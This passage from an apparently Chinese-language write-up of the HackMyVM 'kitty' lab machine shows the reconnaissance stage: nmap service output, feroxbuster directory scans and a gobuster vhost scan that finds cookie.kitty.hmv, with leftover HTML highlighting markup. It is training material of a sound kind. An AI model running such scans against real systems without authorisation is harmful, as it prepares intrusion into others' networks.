Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00016s latency<span class="token punctuation">)</span>.

PORT     STATE SERVICE VERSION
<span class="token number">22</span>/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">8</span>.4p1 Debian <span class="token number">5</span> <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">3072</span> <span class="token number">27</span>:71:24:58:d3:7c:b3:8a:7b:32:49:d1:c8:0b:4c:ba <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   <span class="token number">256</span> e2:30:67:38:7b:db:9a:86:21:01:3e:bf:0e:e7:4f:26 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> 5d:78:c5:37:a8:58:dd:c4:b6:bd:ce:b5:ba:bf:53:dc <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">80</span>/tcp   <span class="token function">open</span>  http    nginx <span class="token number">1.18</span>.0
<span class="token operator">|</span>_http-server-header: nginx/1.18.0
<span class="token operator">|</span>_http-title: Did not follow redirect to http://kitty.hmv
<span class="token number">3000</span>/tcp <span class="token function">open</span>  ppp?
<span class="token operator">|</span> fingerprint-strings: 
<span class="token operator">|</span>   GenericLines, Help, RTSPRequest: 
<span class="token operator">|</span>     HTTP/1.1 <span class="token number">400</span> Bad Request
<span class="token operator">|</span>     Content-Type: text/plain<span class="token punctuation">;</span> <span class="token assign-left variable">charset</span><span class="token operator">=</span>utf-8
<span class="token operator">|</span>     Connection: close
<span class="token operator">|</span>     Request
<span class="token operator">|</span>   GetRequest: 
<span class="token operator">|</span>     HTTP/1.0 <span class="token number">200</span> OK
<span class="token operator">|</span>     Content-Type: text/html<span class="token punctuation">;</span> <span class="token assign-left variable">charset</span><span class="token operator">=</span>UTF-8
<span class="token operator">|</span>     Set-Cookie: <span class="token assign-left variable">i_like_gitea</span><span class="token operator">=</span>7b367acd112a3462<span class="token punctuation">;</span> <span class="token assign-left variable">Path</span><span class="token operator">=</span>/<span class="token punctuation">;</span> HttpOnly<span class="token punctuation">;</span> <span class="token assign-left variable">SameSite</span><span class="token operator">=</span>Lax
<span class="token operator">|</span>     Set-Cookie: <span class="token assign-left variable">_csrf</span><span class="token operator">=</span>OuFjglI6jUvh-D8QerziXZUxl8c6MTcyMzgwODMxNzk0MzgyODkxOQ<span class="token punctuation">;</span> <span class="token assign-left variable">Path</span><span class="token operator">=</span>/<span class="token punctuation">;</span> <span class="token assign-left variable">Expires</span><span class="token operator">=</span>Sat, <span class="token number">17</span> Aug <span class="token number">2024</span> <span class="token number">11</span>:38:37 GMT<span class="token punctuation">;</span> HttpOnly<span class="token punctuation">;</span> <span class="token assign-left variable">SameSite</span><span class="token operator">=</span>Lax
<span class="token operator">|</span>     Set-Cookie: <span class="token assign-left variable">macaron_flash</span><span class="token operator">=</span><span class="token punctuation">;</span> <span class="token assign-left variable">Path</span><span class="token operator">=</span>/<span class="token punctuation">;</span> Max-Age<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> HttpOnly<span class="token punctuation">;</span> <span class="token assign-left variable">SameSite</span><span class="token operator">=</span>Lax
<span class="token operator">|</span>     X-Frame-Options: SAMEORIGIN
<span class="token operator">|</span>     Date: Fri, <span class="token number">16</span> Aug <span class="token number">2024</span> <span class="token number">11</span>:38:37 GMT
<span class="token operator">|</span>     <span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html<span class="token operator">></span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>html <span class="token assign-left variable">lang</span><span class="token operator">=</span><span class="token string">"en-US"</span> <span class="token assign-left variable">class</span><span class="token operator">=</span><span class="token string">"theme-"</span><span class="token operator">></span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>head<span class="token operator">></span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>meta <span class="token assign-left variable">charset</span><span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token operator">></span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>meta <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"viewport"</span> <span class="token assign-left variable">content</span><span class="token operator">=</span><span class="token string">"width=device-width, initial-scale=1"</span><span class="token operator">></span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>title<span class="token operator">></span> Gitea: Git with a cup of tea<span class="token operator">&lt;</span>/title<span class="token operator">></span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>link <span class="token assign-left variable">rel</span><span class="token operator">=</span><span class="token string">"manifest"</span> <span class="token assign-left variable">href</span><span class="token operator">=</span><span class="token string">"data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8vbG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Set-Cookie: i_like_gitea=9dbcdb152475477f; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=CkOUXeubcHoO4z2NGYPQFaGElMQ6MTcyMzgwODMyMjk3ODI4MzA1Mw; Path=/; Expires=Sat, 17 Aug 2024 11:38:42 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Fri, 16 Aug 2024 11:38:42 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.94SVN%I=7%D=8/16%Time=66BF3A3D%P=x86_64-pc-linux-gnu%r
SF:(GenericLines,67,"</span>HTTP/1<span class="token punctuation">\</span>.1<span class="token punctuation">\</span>x20400<span class="token punctuation">\</span>x20Bad<span class="token punctuation">\</span>x20Request<span class="token punctuation">\</span>r<span class="token punctuation">\</span>nContent-Type:<span class="token punctuation">\</span>x
SF:20text/plain<span class="token punctuation">;</span><span class="token punctuation">\</span>x20charset<span class="token operator">=</span>utf-8<span class="token punctuation">\</span>r<span class="token punctuation">\</span>nConnection:<span class="token punctuation">\</span>x20close<span class="token punctuation">\</span>r<span class="token punctuation">\</span>n<span class="token punctuation">\</span>r<span class="token punctuation">\</span>n400<span class="token punctuation">\</span>x20Ba
SF:d<span class="token punctuation">\</span>x20Request<span class="token string">")%r(GetRequest,3459,"</span>HTTP/1<span class="token punctuation">\</span>.0<span class="token punctuation">\</span>x20200<span class="token punctuation">\</span>x20OK<span class="token punctuation">\</span>r<span class="token punctuation">\</span>nContent-Typ
SF:e:<span class="token punctuation">\</span>x20text/html<span class="token punctuation">;</span><span class="token punctuation">\</span>x20charset<span class="token operator">=</span>UTF-8<span class="token punctuation">\</span>r<span class="token punctuation">\</span>nSet-Cookie:<span class="token punctuation">\</span>x20i_like_gitea<span class="token operator">=</span>7b367a
SF:cd112a3462<span class="token punctuation">;</span><span class="token punctuation">\</span>x20Path<span class="token operator">=</span>/<span class="token punctuation">;</span><span class="token punctuation">\</span>x20HttpOnly<span class="token punctuation">;</span><span class="token punctuation">\</span>x20SameSite<span class="token operator">=</span>Lax<span class="token punctuation">\</span>r<span class="token punctuation">\</span>nSet-Cookie:<span class="token punctuation">\</span>x20_
SF:csrf<span class="token operator">=</span>OuFjglI6jUvh-D8QerziXZUxl8c6MTcyMzgwODMxNzk0MzgyODkxOQ<span class="token punctuation">;</span><span class="token punctuation">\</span>x20Path<span class="token operator">=</span>/<span class="token punctuation">;</span>
SF:<span class="token punctuation">\</span>x20Expires<span class="token operator">=</span>Sat,<span class="token punctuation">\</span>x2017<span class="token punctuation">\</span>x20Aug<span class="token punctuation">\</span>x202024<span class="token punctuation">\</span>x2011:38:37<span class="token punctuation">\</span>x20GMT<span class="token punctuation">;</span><span class="token punctuation">\</span>x20HttpOnly<span class="token punctuation">;</span><span class="token punctuation">\</span>
SF:x20SameSite<span class="token operator">=</span>Lax<span class="token punctuation">\</span>r<span class="token punctuation">\</span>nSet-Cookie:<span class="token punctuation">\</span>x20macaron_flash<span class="token operator">=</span><span class="token punctuation">;</span><span class="token punctuation">\</span>x20Path<span class="token operator">=</span>/<span class="token punctuation">;</span><span class="token punctuation">\</span>x20Max-Age
SF:<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">\</span>x20HttpOnly<span class="token punctuation">;</span><span class="token punctuation">\</span>x20SameSite<span class="token operator">=</span>Lax<span class="token punctuation">\</span>r<span class="token punctuation">\</span>nX-Frame-Options:<span class="token punctuation">\</span>x20SAMEORIGIN<span class="token punctuation">\</span>r<span class="token punctuation">\</span>nD
SF:ate:<span class="token punctuation">\</span>x20Fri,<span class="token punctuation">\</span>x2016<span class="token punctuation">\</span>x20Aug<span class="token punctuation">\</span>x202024<span class="token punctuation">\</span>x2011:38:37<span class="token punctuation">\</span>x20GMT<span class="token punctuation">\</span>r<span class="token punctuation">\</span>n<span class="token punctuation">\</span>r<span class="token punctuation">\</span>n<span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE<span class="token punctuation">\</span>x
SF:20html<span class="token operator">></span><span class="token punctuation">\</span>n<span class="token operator">&lt;</span>html<span class="token punctuation">\</span>x20lang<span class="token operator">=</span><span class="token punctuation">\</span>"en-US<span class="token punctuation">\</span>"<span class="token punctuation">\</span>x20class<span class="token operator">=</span><span class="token punctuation">\</span>"theme-<span class="token punctuation">\</span>"<span class="token operator">></span><span class="token punctuation">\</span>n<span class="token operator">&lt;</span>head<span class="token operator">></span><span class="token punctuation">\</span>n<span class="token punctuation">\</span>t<span class="token operator">&lt;</span>meta<span class="token punctuation">\</span>
SF:x20charset<span class="token operator">=</span><span class="token punctuation">\</span>"utf-8<span class="token punctuation">\</span>"<span class="token operator">></span><span class="token punctuation">\</span>n<span class="token punctuation">\</span>t<span class="token operator">&lt;</span>meta<span class="token punctuation">\</span>x20name<span class="token operator">=</span><span class="token punctuation">\</span>"viewport<span class="token punctuation">\</span>"<span class="token punctuation">\</span>x20content<span class="token operator">=</span><span class="token punctuation">\</span>"width<span class="token operator">=</span>
SF:device-width,<span class="token punctuation">\</span>x20initial-scale<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">\</span>"<span class="token operator">></span><span class="token punctuation">\</span>n<span class="token punctuation">\</span>t<span class="token operator">&lt;</span>title<span class="token operator">></span><span class="token punctuation">\</span>x20Gitea:<span class="token punctuation">\</span>x20Git<span class="token punctuation">\</span>x20with
SF:<span class="token punctuation">\</span>x20a<span class="token punctuation">\</span>x20cup<span class="token punctuation">\</span>x20of<span class="token punctuation">\</span>x20tea<span class="token operator">&lt;</span>/title<span class="token operator">></span><span class="token punctuation">\</span>n<span class="token punctuation">\</span>t<span class="token operator">&lt;</span>link<span class="token punctuation">\</span>x20rel<span class="token operator">=</span><span class="token punctuation">\</span>"manifest<span class="token punctuation">\</span>"<span class="token punctuation">\</span>x20href<span class="token operator">=</span>
SF:<span class="token punctuation">\</span>"data:application/json<span class="token punctuation">;</span>base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3Vw
SF:IG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiw
SF:ic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOi
SF:JodHRwOi8vbG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb<span class="token string">")%r(Help,67,"</span>HTTP/1<span class="token punctuation">\</span>.1<span class="token punctuation">\</span>
SF:x20400<span class="token punctuation">\</span>x20Bad<span class="token punctuation">\</span>x20Request<span class="token punctuation">\</span>r<span class="token punctuation">\</span>nContent-Type:<span class="token punctuation">\</span>x20text/plain<span class="token punctuation">;</span><span class="token punctuation">\</span>x20charset<span class="token operator">=</span>utf
SF:-8<span class="token punctuation">\</span>r<span class="token punctuation">\</span>nConnection:<span class="token punctuation">\</span>x20close<span class="token punctuation">\</span>r<span class="token punctuation">\</span>n<span class="token punctuation">\</span>r<span class="token punctuation">\</span>n400<span class="token punctuation">\</span>x20Bad<span class="token punctuation">\</span>x20Request<span class="token string">")%r(HTTPOptions
SF:,19B,"</span>HTTP/1<span class="token punctuation">\</span>.0<span class="token punctuation">\</span>x20405<span class="token punctuation">\</span>x20Method<span class="token punctuation">\</span>x20Not<span class="token punctuation">\</span>x20Allowed<span class="token punctuation">\</span>r<span class="token punctuation">\</span>nSet-Cookie:<span class="token punctuation">\</span>x20i_
SF:like_gitea<span class="token operator">=</span>9dbcdb152475477f<span class="token punctuation">;</span><span class="token punctuation">\</span>x20Path<span class="token operator">=</span>/<span class="token punctuation">;</span><span class="token punctuation">\</span>x20HttpOnly<span class="token punctuation">;</span><span class="token punctuation">\</span>x20SameSite<span class="token operator">=</span>Lax<span class="token punctuation">\</span>r<span class="token punctuation">\</span>
SF:nSet-Cookie:<span class="token punctuation">\</span>x20_csrf<span class="token operator">=</span>CkOUXeubcHoO4z2NGYPQFaGElMQ6MTcyMzgwODMyMjk3ODI4M
SF:zA1Mw<span class="token punctuation">;</span><span class="token punctuation">\</span>x20Path<span class="token operator">=</span>/<span class="token punctuation">;</span><span class="token punctuation">\</span>x20Expires<span class="token operator">=</span>Sat,<span class="token punctuation">\</span>x2017<span class="token punctuation">\</span>x20Aug<span class="token punctuation">\</span>x202024<span class="token punctuation">\</span>x2011:38:42<span class="token punctuation">\</span>x20G
SF:MT<span class="token punctuation">;</span><span class="token punctuation">\</span>x20HttpOnly<span class="token punctuation">;</span><span class="token punctuation">\</span>x20SameSite<span class="token operator">=</span>Lax<span class="token punctuation">\</span>r<span class="token punctuation">\</span>nSet-Cookie:<span class="token punctuation">\</span>x20macaron_flash<span class="token operator">=</span><span class="token punctuation">;</span><span class="token punctuation">\</span>x20P
SF:ath<span class="token operator">=</span>/<span class="token punctuation">;</span><span class="token punctuation">\</span>x20Max-Age<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">\</span>x20HttpOnly<span class="token punctuation">;</span><span class="token punctuation">\</span>x20SameSite<span class="token operator">=</span>Lax<span class="token punctuation">\</span>r<span class="token punctuation">\</span>nX-Frame-Options:<span class="token punctuation">\</span>x
SF:20SAMEORIGIN<span class="token punctuation">\</span>r<span class="token punctuation">\</span>nDate:<span class="token punctuation">\</span>x20Fri,<span class="token punctuation">\</span>x2016<span class="token punctuation">\</span>x20Aug<span class="token punctuation">\</span>x202024<span class="token punctuation">\</span>x2011:38:42<span class="token punctuation">\</span>x20GMT<span class="token punctuation">\</span>r
SF:<span class="token punctuation">\</span>nContent-Length:<span class="token punctuation">\</span>x200<span class="token punctuation">\</span>r<span class="token punctuation">\</span>n<span class="token punctuation">\</span>r<span class="token punctuation">\</span>n<span class="token string">")%r(RTSPRequest,67,"</span>HTTP/1<span class="token punctuation">\</span>.1<span class="token punctuation">\</span>x20400<span class="token punctuation">\</span>x20
SF:Bad<span class="token punctuation">\</span>x20Request<span class="token punctuation">\</span>r<span class="token punctuation">\</span>nContent-Type:<span class="token punctuation">\</span>x20text/plain<span class="token punctuation">;</span><span class="token punctuation">\</span>x20charset<span class="token operator">=</span>utf-8<span class="token punctuation">\</span>r<span class="token punctuation">\</span>nConn
SF:ection:<span class="token punctuation">\</span>x20close<span class="token punctuation">\</span>r<span class="token punctuation">\</span>n<span class="token punctuation">\</span>r<span class="token punctuation">\</span>n400<span class="token punctuation">\</span>x20Bad<span class="token punctuation">\</span>x20Request"<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>80端口是个web服务，加个域名<code>kitty.hmv</code>到&#x2F;etc&#x2F;hosts,3000端口是gitea服务。</p>
<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p><img src="https://ooo.0x0.ooo/2024/08/16/OtKV7v.png" alt="OtKV7v.png" loading="lazy"><br>没有什么交互点，扫一下目录</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">t@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  feroxbuster <span class="token parameter variable">-u</span> http://kitty.hmv <span class="token parameter variable">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                                                                                                          <span class="token punctuation">[</span><span class="token number">19</span>:47:58<span class="token punctuation">]</span>
                                                                                                                                                                                                                                              
 ___  ___  __   __     __      __         __   ___
<span class="token operator">|</span>__  <span class="token operator">|</span>__  <span class="token operator">|</span>__<span class="token punctuation">)</span> <span class="token operator">|</span>__<span class="token punctuation">)</span> <span class="token operator">|</span> /  `    /  <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/ <span class="token operator">|</span> <span class="token operator">|</span>  <span class="token punctuation">\</span> <span class="token operator">|</span>__
<span class="token operator">|</span>    <span class="token operator">|</span>___ <span class="token operator">|</span>  <span class="token punctuation">\</span> <span class="token operator">|</span>  <span class="token punctuation">\</span> <span class="token operator">|</span> <span class="token punctuation">\</span>__,    <span class="token punctuation">\</span>__/ / <span class="token punctuation">\</span> <span class="token operator">|</span> <span class="token operator">|</span>__/ <span class="token operator">|</span>___
by Ben <span class="token string">"epi"</span> Risher 🤓                 ver: <span class="token number">2.10</span>.4
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://kitty.hmv
 🚀  Threads               │ <span class="token number">50</span>
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes<span class="token operator">!</span>
 💥  Timeout <span class="token punctuation">(</span>secs<span class="token punctuation">)</span>        │ <span class="token number">7</span>
 🦡  User-Agent            │ feroxbuster/2.10.4
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ <span class="token boolean">true</span>
 🏁  HTTP methods          │ <span class="token punctuation">[</span>GET<span class="token punctuation">]</span>
 🔃  Recursion Depth       │ <span class="token number">4</span>
───────────────────────────┴──────────────────────
 🏁  Press <span class="token punctuation">[</span>ENTER<span class="token punctuation">]</span> to use the Scan Management Menu™
──────────────────────────────────────────────────
<span class="token number">404</span>      GET        7l       11w      153c Auto-filtering found <span class="token number">404</span>-like response and created new filter<span class="token punctuation">;</span> toggle off with --dont-filter
<span class="token number">301</span>      GET        7l       11w      169c http://kitty.hmv/images <span class="token operator">=</span><span class="token operator">></span> http://kitty.hmv/images/
<span class="token number">200</span>      GET       43l      177w    13620c http://kitty.hmv/images/picture5.jpg
<span class="token number">200</span>      GET       22l      152w     8780c http://kitty.hmv/images/picture1.jpg
<span class="token number">200</span>      GET       40l      160w    11741c http://kitty.hmv/images/loading.gif
<span class="token number">200</span>      GET       30l      174w    10532c http://kitty.hmv/images/picture2.jpg
<span class="token number">200</span>      GET      474l      778w     8919c http://kitty.hmv/css/styles.css
<span class="token number">200</span>      GET       33l      202w    13156c http://kitty.hmv/images/picture4.jpg
<span class="token number">200</span>      GET       21l      154w     7851c http://kitty.hmv/js/slides.min.jquery.js
<span class="token number">200</span>      GET        3l       69w     2394c http://kitty.hmv/js/html5.js
<span class="token number">200</span>      GET       29l      222w    15380c http://kitty.hmv/images/picture3.jpg
<span class="token number">200</span>      GET      366l     1417w   114818c http://kitty.hmv/images/banner1.jpg
<span class="token number">200</span>      GET      401l     1500w   118673c http://kitty.hmv/images/banner3.jpg
<span class="token number">200</span>      GET      102l      646w    50653c http://kitty.hmv/images/cat_paw_prints.png
<span class="token number">200</span>      GET      320l     1502w   119218c http://kitty.hmv/images/banner2.jpg
<span class="token number">200</span>      GET       16l     1267w    85260c http://kitty.hmv/js/jquery-1.5.1.min.js
<span class="token number">200</span>      GET      114l      577w     5381c http://kitty.hmv/
<span class="token number">403</span>      GET        7l        9w      153c http://kitty.hmv/css/
<span class="token number">403</span>      GET        7l        9w      153c http://kitty.hmv/js/
<span class="token number">301</span>      GET        7l       11w      169c http://kitty.hmv/css <span class="token operator">=</span><span class="token operator">></span> http://kitty.hmv/css/
<span class="token number">301</span>      GET        7l       11w      169c http://kitty.hmv/js <span class="token operator">=</span><span class="token operator">></span> http://kitty.hmv/js/
<span class="token punctuation">[</span><span class="token comment">####################] - 80s   882203/882203  0s      found:20      errors:0      </span>
<span class="token punctuation">[</span><span class="token comment">####################] - 80s   220546/220546  2765/s  http://kitty.hmv/ </span>
<span class="token punctuation">[</span><span class="token comment">####################] - 79s   220546/220546  2777/s  http://kitty.hmv/images/ </span>
<span class="token punctuation">[</span><span class="token comment">####################] - 80s   220546/220546  2770/s  http://kitty.hmv/js/ </span>
<span class="token punctuation">[</span><span class="token comment">####################] - 80s   220546/220546  2769/s  http://kitty.hmv/css/  </span></code></pre>
<p>没有什么敏感目录，扫一下子域</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  gobuster vhost <span class="token parameter variable">-u</span> http://kitty.hmv <span class="token parameter variable">--domain</span> kitty.hmv <span class="token parameter variable">-w</span> /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain <span class="token parameter variable">-r</span>                                                <span class="token punctuation">[</span><span class="token number">19</span>:49:44<span class="token punctuation">]</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Gobuster v3.6
by OJ Reeves <span class="token punctuation">(</span>@TheColonial<span class="token punctuation">)</span> <span class="token operator">&amp;</span> Christian Mehlmauer <span class="token punctuation">(</span>@firefart<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Url:             http://kitty.hmv
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Method:          GET
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Threads:         <span class="token number">10</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Wordlist:        /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> User Agent:      gobuster/3.6
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Timeout:         10s
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Append Domain:   <span class="token boolean">true</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Starting gobuster <span class="token keyword">in</span> VHOST enumeration mode
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Found: cookie.kitty.hmv Status: <span class="token number">200</span> <span class="token punctuation">[</span>Size: <span class="token number">2785</span><span class="token punctuation">]</span>
Progress: <span class="token number">114441</span> / <span class="token number">114442</span> <span class="token punctuation">(</span><span class="token number">100.00</span>%<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Finished
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span></code></pre>
<p>扫到一个子域<code>cookie.kitty.hmv</code>，添加到hosts<br><img src="https://ooo.0x0.ooo/2024/08/16/OtKYLq.png" alt="OtKYLq.png" loading="lazy"><br>先扫下目录</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">oot@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  feroxbuster <span class="token parameter variable">-u</span> http://cookie.kitty.hmv <span class="token parameter variable">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                                                                                                   <span class="token punctuation">[</span><span class="token number">19</span>:55:01<span class="token punctuation">]</span>
                                                                                                                                                                                                                                              
 ___  ___  __   __     __      __         __   ___
<span class="token operator">|</span>__  <span class="token operator">|</span>__  <span class="token operator">|</span>__<span class="token punctuation">)</span> <span class="token operator">|</span>__<span class="token punctuation">)</span> <span class="token operator">|</span> /  `    /  <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/ <span class="token operator">|</span> <span class="token operator">|</span>  <span class="token punctuation">\</span> <span class="token operator">|</span>__
<span class="token operator">|</span>    <span class="token operator">|</span>___ <span class="token operator">|</span>  <span class="token punctuation">\</span> <span class="token operator">|</span>  <span class="token punctuation">\</span> <span class="token operator">|</span> <span class="token punctuation">\</span>__,    <span class="token punctuation">\</span>__/ / <span class="token punctuation">\</span> <span class="token operator">|</span> <span class="token operator">|</span>__/ <span class="token operator">|</span>___
by Ben <span class="token string">"epi"</span> Risher 🤓                 ver: <span class="token number">2.10</span>.4
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://cookie.kitty.hmv
 🚀  Threads               │ <span class="token number">50</span>
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes<span class="token operator">!</span>
 💥  Timeout <span class="token punctuation">(</span>secs<span class="token punctuation">)</span>        │ <span class="token number">7</span>
 🦡  User-Agent            │ feroxbuster/2.10.4
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ <span class="token boolean">true</span>
 🏁  HTTP methods          │ <span class="token punctuation">[</span>GET<span class="token punctuation">]</span>
 🔃  Recursion Depth       │ <span class="token number">4</span>
───────────────────────────┴──────────────────────
 🏁  Press <span class="token punctuation">[</span>ENTER<span class="token punctuation">]</span> to use the Scan Management Menu™
──────────────────────────────────────────────────
<span class="token number">404</span>      GET        7l       11w      153c Auto-filtering found <span class="token number">404</span>-like response and created new filter<span class="token punctuation">;</span> toggle off with --dont-filter
<span class="token number">301</span>      GET        7l       11w      169c http://cookie.kitty.hmv/home <span class="token operator">=</span><span class="token operator">></span> http://cookie.kitty.hmv/home/
